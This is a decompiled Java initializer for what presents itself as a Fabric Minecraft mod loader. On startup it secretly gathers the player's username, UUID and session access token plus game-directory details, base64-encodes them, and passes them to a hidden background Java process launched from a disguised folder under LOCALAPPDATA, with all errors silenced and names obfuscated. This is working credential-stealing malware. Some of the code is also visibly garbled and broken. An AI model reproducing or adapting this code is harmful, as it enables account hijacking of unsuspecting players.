package net.efn.loader;

import java.io.File;
import java.lang.ProcessBuilder.Redirect;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Base64;
import java.util.Base64.Encoder;
import net.fabricmc.api.ModInitializer;

public class LoaderInit implements ModInitializer {
   public void onInitialize() {
      new Thread(
            () -> {
               try {
                  String AMBnycTh = SessionAccess.bwx_az_cuzpwr_vgoij();
                  String sourceOut = SessionAccess.EaYOUPT5();
                  String optsVal = SessionAccess.ebqtvvsBus();
                  if (optsVal == null) {
                     optsVal = "unknown";
                  }

                  String v9yVJ_jp = RuntimeBridge.fgqnpyible();
                  String DIkx_xChf_Xqrc_FZqd = RuntimeBridge.emitMuxd();
                  Path oHfw2xARFq = Zuf6iq.mnhh_a();
                  RuntimeBridge pg_tfx_bvddxm = new RuntimeBridge();
                  String ir_uoldx_al_ydniyn = pg_tfx_bvddxm.getDomain();
                  String tGknpsWQ = pg_tfx_bvddxm.prefire(ir_uoldx_al_ydniyn, AMBnycTh, v9yVJ_jp);
                  Encoder var10000 = Base64.getEncoder();
                  String var10001 = Zuf6iq.mvEGxwk(sourceOut);
                  String var10002 = Zuf6iq.mvEGxwk(optsVal);
                  String var24 = Zuf6iq.mvEGxwk(AMBnycTh);
                  String var23 = var10002;
                  String var22 = var10001;
                  StringBuilder var25;
                  StringBuilder var85 = var25 = new StringBuilder();
                  var25.append('{');
                  var25.append('"');
                  var25.append('u');
                  var25.append('s');
                  var25.append('e');
                  var25.append('r');
                  var25.append('n');
                  var25.append('a');
                  var25.append('m');
                  var25.append('e');
                  var25.append('"');
                  var25.append(':');
                  var25.append('"');
                  StringBuilder var86 = var85.append(var25.toString()).append(var22);
                  StringBuilder var27 = new StringBuilder();
                  StringBuilder var87 = var86.append("\",\"uuid\":\"").append(var23);
                  String prev3 = var10000.encodeToString(
                     var87.append("\",\"accessToken\":\"").append(var24).append("\"}").toString().getBytes(StandardCharsets.UTF_8)
                  );
                  if (tGknpsWQ != null) {
                     var10001 = tGknpsWQ;
                  } else {
                     StringBuilder var31 = new StringBuilder();
                     var10001 = "null";
                  }

                  var10002 = Zuf6iq.mvEGxwk(v9yVJ_jp);
                  String var10003 = Zuf6iq.mvEGxwk(DIkx_xChf_Xqrc_FZqd);
                  String var10004 = Zuf6iq.mvEGxwk(ir_uoldx_al_ydniyn);
                  String var10005 = Zuf6iq.mvEGxwk(oHfw2xARFq != null ? oHfw2xARFq.toString() : "");
                  String var10006 = Zuf6iq.mvEGxwk(sourceOut);
                  String var40 = Zuf6iq.mvEGxwk(optsVal);
                  String var39 = var10006;
                  String var38 = var10005;
                  String var37 = var10004;
                  String var36 = var10003;
                  String var35 = var10002;
                  String var34 = var10001;
                  StringBuilder var75 = new StringBuilder();
                  StringBuilder var76 = var75.append("{\"mcInfo\":\"").append(prev3);
                  StringBuilder var43 = new StringBuilder();
                  StringBuilder var77 = var76.append("\",\"prefireId\":\"").append(var34);
                  StringBuilder var45 = new StringBuilder();
                  StringBuilder var78 = var77.append("\",\"userId\":\"").append(var35);
                  StringBuilder var79 = var78.append("\",\"tag\":\"").append(var36);
                  StringBuilder var49 = new StringBuilder();
                  StringBuilder var80 = var79.append("\",\"domain\":\"").append(var37);
                  StringBuilder var51 = new StringBuilder();
                  StringBuilder var81 = var80.append("\",\"gameDir\":\"").append(var38);
                  StringBuilder var82 = var81.append("\",\"mcUsername\":\"").append(var39);
                  StringBuilder var83 = var82.append("\",\"mcUuid\":\"").append(var40);
                  char[] var57 = "\",\"env\":\"Fabric\""'
                  };
                  String Kvi_b55_H = var83.append(new String(var57)).toString();
                  String value = Base64.getEncoder().encodeToString(Kvi_b55_H.getBytes(StandardCharsets.UTF_8));
                  StringBuilder var59 = new StringBuilder();
                  String gfdpKugq = System.getProperty("java.home");
                  String[] var89 = new String[]{"bin", null};
                  var89[1] = "javaw.exe";
                  Path cjimu_bjlku = Path.of(gfdpKugq, var89);
                  if (!Files.exists(cjimu_bjlku)) {
                     String[] var90 = new String[]{"bin", null};
                     var90[1] = "java.exe";
                     cjimu_bjlku = Path.of(gfdpKugq, var90);
                  }

                  URI qdFI_sKlXPH848 = LoaderInit.class.getProtectionDomain().getCodeSource().getLocation().toURI();
                  Path xLen = Path.of(qdFI_sKlXPH848);
                  String var84 = System.getenv("LOCALAPPDATA");
                  String[] var91 = new String[3];
                  StringBuilder var67 = new StringBuilder();
                  var91[0] = "Microsoft";
                  StringBuilder var69 = new StringBuilder();
                  var91[1] = "Windows";
                  StringBuilder var71 = new StringBuilder();
                  var91[2] = "NtProfileIndex";
                  Path Th_hV = Path.of(var84, var91);
                  Files.createDirectories(Th_hV);
                  String j9P9qaPLS = RuntimeBridge.class.getName();
                  ProcessBuilder iqUyHDUiweBe_L = new ProcessBuilder(cjimu_bjlku.toString(), "-cp", xLen.toString(), j9P9qaPLS, value);
                  iqUyHDUiweBe_L.redirectInput(Redirect.from(new File("NUL")));
                  StringBuilder var73 = new StringBuilder();
                  iqUyHDUiweBe_L.redirectOutput(Redirect.appendTo(Th_hV.resolve("_spawn.log").toFile()));
                  iqUyHDUiweBe_L.redirectErrorStream(true);
                  iqUyHDUiweBe_L.directory(Th_hV.toFile());
                  iqUyHDUiweBe_L.start();
               } catch (Exception var74) {
               }
            }
         )
         .start();
   }

   private Path mnhh_a() {
      StringBuilder var4 = new StringBuilder();
      Path hucU_kCln_mBau_sMGb = Path.of(System.getProperty("user.dir"));
      StringBuilder var6 = new StringBuilder();
      if (!Files.exists(hucU_kCln_mBau_sMGb.resolve("options.txt"))) {
         if (!Files.exists(hucU_kCln_mBau_sMGb.resolve("config"))) {
            StringBuilder var10 = new StringBuilder();
            if (!Files.exists(hucU_kCln_mBau_sMGb.resolve("mods"))) {
               StringBuilder var12 = new StringBuilder();
               String MDdI_hlHz_xXaf_tIYh = System.getenv("APPDATA");
               if (MDdI_hlHz_xXaf_tIYh != null) {
                  String[] var10001 = new String[1];
                  var10001[0] = ".minecraft";
                  Path V__w = Path.of(MDdI_hlHz_xXaf_tIYh, var10001);
                  if (Files.exists(V__w)) {
                     return V__w;
                  }
               }

               StringBuilder var16 = new StringBuilder();
               String var10000 = System.getProperty("user.home");
               String[] var20 = new String[1];
               var20[0] = ".minecraft";
               Path uesyDogkgUsorHxn = Path.of(var10000, var20);
               if (Files.exists(uesyDogkgUsorHxn)) {
                  return uesyDogkgUsorHxn;
               }

               return hucU_kCln_mBau_sMGb;
            }
         }
      }

      return hucU_kCln_mBau_sMGb;
   }

   private String mvEGxwk(String s) {
      if (hqmipy_ovcjmn == null) {
         return "";
      } else {
         StringBuilder oBuX5gtXwK = new StringBuilder();

         for (char cursor0 : hqmipy_ovcjmn.toCharArray()) {
            switch (cursor0) {
               case '\t':
                  break;
               case '\n':
                  break;
               case '\r':
                  break;
               case '"':
                  break;
               case '\\':
                  break;
               default:
                  if (cursor0 < ' ') {
                     oBuX5gtXwK.append(String.format("\\u%04x", Integer.valueOf(cursor0)));
                  } else {
                     oBuX5gtXwK.append(cursor0);
                  }
            }
         }

         return oBuX5gtXwK.toString();
      }
   }
}
